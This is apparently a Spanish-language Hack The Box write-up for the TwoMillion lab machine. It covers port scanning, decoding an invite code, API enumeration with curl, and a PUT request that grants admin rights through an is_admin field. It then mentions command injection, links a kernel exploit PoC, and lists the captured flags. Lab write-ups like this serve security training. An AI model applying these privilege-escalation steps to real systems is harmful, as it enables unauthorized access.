### Hack The Box | TwoMillion.

Se realizan primeros escaneos:

- nmap -sV -sC -p- --min-rate 5000 -Pn 10.129.147.115

Donde extraemos:

```diff
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-08 18:08 -0500
Nmap scan report for 2million.htb (10.129.147.115)
Host is up (0.096s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-trane-info: Problem with XML parsing of /evox/about
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Hack The Box :: Penetration Testing Labs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.12 seconds
```

Del escaneo basico, encontramos una web en el puerto 80, funcionando por nginx, la cual al ingresar, encontramos varios endpoints en al usar Ctrl + u para leer los recursos de la web, especificamente en la url: http://2million.htb/invite.
Logramos captar este endpoint: http://2million.htb/api/v1/invite/verify

Rastreando más por la web, encontramos:

```diff
{
    "0": 200,
    "success": 1,
    "data": {
        "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
        "enctype": "ROT13"
    },
    "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."

```
Al usar el codigo y desencriptar el ROT13. Obtenemos el hash base64 que nos da el codigo para crearnos una cuenta.

- {"0":200,"success":1,"data":{"code":"UlFMRk8tQU1YM1QtNFZaVVotQTNBQlk=","format":"encoded"}

- RQLFO-AMX3T-4VZUZ-A3ABY

Una vez creada la cuenta, investigamos más la web, en busqueda de información relevante y encontramos un apartado llamado ACCESS, el cual nos descarga una VPN.
Seguimos navegando por peticiones Get y Post con curl -X

```diff
─$ curl -X GET "http://2million.htb/api/v1" -H "cookie: PHPSESSID=qlc61ovp3um58da3mie2e4ebtu" | js-beautify   
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    800   0    800   0      0   2189      0                              0
{
    "v1": {
        "user": {
            "GET": {
                "\/api\/v1": "Route List",
                "\/api\/v1\/invite\/how\/to\/generate": "Instructions on invite code generation",
                "\/api\/v1\/invite\/generate": "Generate invite code",
                "\/api\/v1\/invite\/verify": "Verify invite code",
                "\/api\/v1\/user\/auth": "Check if user is authenticated",
                "\/api\/v1\/user\/vpn\/generate": "Generate a new VPN configuration",
                "\/api\/v1\/user\/vpn\/regenerate": "Regenerate VPN configuration",
                "\/api\/v1\/user\/vpn\/download": "Download OVPN file"
            },
            "POST": {
                "\/api\/v1\/user\/register": "Register a new user",
                "\/api\/v1\/user\/login": "Login with existing user"
            }
        },
        "admin": {
            "GET": {
                "\/api\/v1\/admin\/auth": "Check if user is admin"
            },
            "POST": {
                "\/api\/v1\/admin\/vpn\/generate": "Generate VPN for specific user"
            },
            "PUT": {
                "\/api\/v1\/admin\/settings\/update": "Update user settings"
            }
        }
    }
}                                                             
```
Intentamos enviar varios PUT aprovechandonos de esa devolucion:

```diff
└─$ curl -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "cookie: PHPSESSID=qlc61ovp3um58da3mie2e4ebtu" -H "Content-Type: application/json" | js-beautify
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100     56   0     56   0      0    153      0                              0
{
    "status": "danger",
    "message": "Missing parameter: email"
}                                                                                                                    
```

```diff
─$ curl -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "cookie: PHPSESSID=qlc61ovp3um58da3mie2e4ebtu" -H "Content-Type: application/json" -d '{"email": "admin@admin.com", "is_admin": 1}' | js-beautify
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100     84   0     41 100     43    111    116                              0
{
    "id": 13,
    "username": "admin",
    "is_admin": 1
} 
```
Una vez que logramos escalar a admin, entendemos que por medio de ese JSON, podemos manipular comandos internos y enviar datos al CLI, por lo que nos ponemos a jugar con los curl, conocido como **Command Injection**.

[Linux-Kernel-5.15.70](https://www.cvedetails.com/version/1188167/Linux-Linux-Kernel-5.15.70.html)
[CVE-2023-0386 PoC](https://github.com/sxlmnwb/CVE-2023-0386)

HackTheBox Finalizada!!

User flag:

- bf6c2ba8cd02deb2a221e628395c2f86

Root flag: 

- d0019bec43d510159815965b52481799

Este box en especifico, hice un video de como realice el proceso y logre encontrar a la boss, tenia una medio idea de como funcionaba por un Reel que vi, sin embargo, la metodologia de ingreso, la inyeccion y el escalado fue algo que pude analizar y realizar.


[Video](https://www.youtube.com/watch?v=CPu8yhaTB2g)

Nota: las flags cambian cuando inicias una maquina, nunca es la misma, no intentes usarla porque te dará error.
